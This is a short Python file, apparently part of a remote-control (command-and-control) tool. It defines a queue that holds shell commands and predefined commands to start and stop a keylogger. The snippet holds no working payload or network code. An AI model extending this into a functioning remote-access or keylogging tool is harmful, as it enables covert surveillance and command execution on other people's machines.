from queue import Queue
from enum import Enum

class PredefinedCommands(Enum):
    START_KEYLOGGER = 1
    STOP_KEYLOGGER = 2

# Make the queue be part of the db or use redis
class Controller:
    def __init__(self) -> None:
        self.command_queue = Queue()

    def get_new_command(self):
        return self.command_queue.get()
    
    def add_shell_command(self, command: str):
        self.command_queue.put(command)

    def add_predefined_command(self, command: PredefinedCommands):
        self.command_queue.put(command)

